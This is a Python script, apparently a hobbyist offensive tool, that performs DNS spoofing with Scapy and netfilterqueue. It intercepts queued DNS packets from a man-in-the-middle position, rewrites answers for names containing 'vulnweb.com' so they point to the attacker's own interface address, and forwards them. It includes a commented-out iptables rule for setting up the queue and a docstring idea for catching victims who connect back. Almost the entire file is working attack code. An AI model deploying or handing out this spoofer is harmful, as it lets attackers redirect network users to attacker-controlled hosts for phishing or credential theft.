#!/usr/bin/env python3.11
"""
  - DNS Spoof Script Using Scapy
  - DNS Spooffer Logic :
    .1. Intercept Target Packets Using MITM Attack Store It In Network Queue .
    .2. Access Intercepted-Packets Queue And Then Modify Target-Packets .
    .3. Resend Modified Packets To Target .

    * Idea to apply, Create server socket and assign it's IP address to the forged packet-field and see if the target will connect back to the socket .
"""

from contextlib import suppress
import netfilterqueue
from scapy.layers.inet import IP, UDP
from scapy.layers.dns import DNSQR, DNSRR, DNS
from psutil import net_if_addrs
# from subprocess import run,DEVNULL

with suppress(KeyboardInterrupt, ValueError, TabError) as Error:
    """
    Start NetFilter Queue Using IPTables . 
    """
    # run(["iptables -I FORWARD -j NFQUEUE --queue-num 0"], stdout=False, stderr=DEVNULL, check=True, text=True)
    INTERFACE: str = input("[INTERFACE] :  ".strip())

    def PACKETSProcessing(PACKET):
        SEPackets: IP = IP(PACKET.get_payload())
        with suppress(IndexError):
            if (
                SEPackets.haslayer(DNS)
                or SEPackets.haslayer(DNSRR)
                or SEPackets.haslayer(DNSQR)
            ) and "vulnweb.com" in SEPackets[DNS][DNSQR].qname.decode():

                def _ExtractFieldsFPacket():
                    print(
                        f"[+] Spoofing Target Successfully Done {SEPackets[DNS][DNSQR].qname.decode()}",
                        end="\n",
                    )
                    DNSForgedResponse: DNSRR = DNSRR(
                        rrname=SEPackets[DNS][DNSQR].qname,
                        ttl=SEPackets[DNS][DNSRR].ttl,
                        rdata=net_if_addrs()[INTERFACE][0][1],
                    )
                    SEPackets[DNS].an = DNSForgedResponse
                    SEPackets[DNS].ancount = 1
                    del SEPackets[IP].chksum
                    del SEPackets[IP].len
                    del SEPackets[UDP].chksum
                    del SEPackets[UDP].len
                    print("\n", SEPackets.show())

                _ExtractFieldsFPacket()
            PACKET.set_payload(bytes(SEPackets))
        "Accept Target Packets To Allow Forward It"
        PACKET.accept()

    PacketsQueue: netfilterqueue = netfilterqueue.NetfilterQueue()
    PacketsQueue.bind(0, PACKETSProcessing)
    PacketsQueue.run()
if Error:
    print(f"[ERROR] {Error}")
